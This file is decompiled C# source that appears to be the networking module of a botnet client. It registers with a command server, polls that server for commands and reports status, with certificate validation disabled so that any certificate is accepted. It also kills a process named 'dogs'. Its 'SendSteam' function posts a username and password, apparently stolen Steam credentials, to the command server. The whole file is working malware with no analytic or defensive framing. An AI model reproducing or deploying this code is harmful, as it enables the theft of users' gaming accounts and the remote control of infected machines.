using System;
using System.Diagnostics;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace a;

[StandardModule]
internal sealed class WEB
{
	private static bool ValidateCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
	{
		return true;
	}

	public static object ReadCommando()
	{
		checked
		{
			try
			{
				WebClient webClient = new WebClient();
				webClient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
				byte[] bytes = Encoding.ASCII.GetBytes("response=2&ID=" + Config.BotId);
				byte[] bytes2 = webClient.UploadData(Config.Server, "POST", bytes);
				return Encoding.ASCII.GetString(bytes2);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				try
				{
					Process[] processes = Process.GetProcesses();
					int num = processes.Length - 1;
					for (int i = 0; i <= num; i++)
					{
						if (Operators.CompareString(Strings.UCase(processes[i].ProcessName), Strings.UCase("dogs"), false) == 0)
						{
							processes[i].Kill();
						}
					}
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				object result = "";
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	public static object SendComment(string comment)
	{
		try
		{
			if (!Config.silent)
			{
				WebClient webClient = new WebClient();
				webClient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
				byte[] bytes = Encoding.ASCII.GetBytes("response=5&ID=" + Config.BotId + "&Comment=" + comment);
				byte[] bytes2 = webClient.UploadData(Config.Server, "POST", bytes);
				return Encoding.ASCII.GetString(bytes2);
			}
			return "";
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = "";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object connect()
	{
		try
		{
			ServicePointManager.ServerCertificateValidationCallback = ValidateCertificate;
			WebClient webClient = new WebClient();
			webClient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
			byte[] bytes = Encoding.ASCII.GetBytes("response=1&ID=" + Config.BotId + "&botv=" + Config.BotVer.ToString());
			byte[] bytes2 = webClient.UploadData(Config.Server, "POST", bytes);
			if ((Operators.CompareString(Encoding.ASCII.GetString(bytes2), "k", false) == 0) | (Operators.CompareString(Encoding.ASCII.GetString(bytes2), "kup", false) == 0))
			{
				return true;
			}
			return false;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object SendError()
	{
		try
		{
			if (!Config.silent)
			{
				WebClient webClient = new WebClient();
				webClient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
				byte[] bytes = Encoding.ASCII.GetBytes("response=E&ID=" + Config.BotId);
				byte[] bytes2 = webClient.UploadData(Config.Server, "POST", bytes);
				return Encoding.ASCII.GetString(bytes2);
			}
			return "";
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = "";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object SendSucsess()
	{
		try
		{
			if (!Config.silent)
			{
				WebClient webClient = new WebClient();
				webClient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
				byte[] bytes = Encoding.ASCII.GetBytes("response=S&ID=" + Config.BotId);
				byte[] bytes2 = webClient.UploadData(Config.Server, "POST", bytes);
				return Encoding.ASCII.GetString(bytes2);
			}
			return "";
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = "";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object SendSteam(string username, string password)
	{
		try
		{
			WebClient webClient = new WebClient();
			webClient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
			byte[] bytes = Encoding.ASCII.GetBytes("response=z&ID=" + Config.BotId + "&username=" + username + "&password=" + password);
			byte[] bytes2 = webClient.UploadData(Config.Server, "POST", bytes);
			return Encoding.ASCII.GetString(bytes2);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = "";
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
